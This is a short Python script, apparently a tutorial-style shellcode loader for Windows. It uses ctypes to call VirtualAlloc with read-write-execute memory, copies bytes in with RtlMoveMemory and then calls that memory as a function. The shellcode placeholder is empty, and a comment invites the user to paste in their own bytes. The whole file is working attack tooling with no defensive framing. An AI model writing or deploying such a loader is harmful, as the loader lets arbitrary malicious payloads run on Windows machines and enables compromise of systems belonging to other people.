import ctypes

kernel32 = ctypes.windll.kernel32 # references windows system apis so functions can be used

def write_memory(buf):
    length = len(buf) # Gets length (useful for allocating memory later)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40) # Allocates needed memory and allows it to be executed
    kernel32.RtlMoveMemory(ptr,buf,length) # Copies shellcode into allocated memory
    return ptr

def execute(shellcode):
    buffer = ctypes.create_string_buffer(shellcode) # Creates buffer
    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None)) # Uses pointer as an executable function
    shell_func()

if __name__ == '__main__':
    shellcode=(b"") # PUT YOUR SHELLCODE BYTES HERE!!
    execute(shellcode)
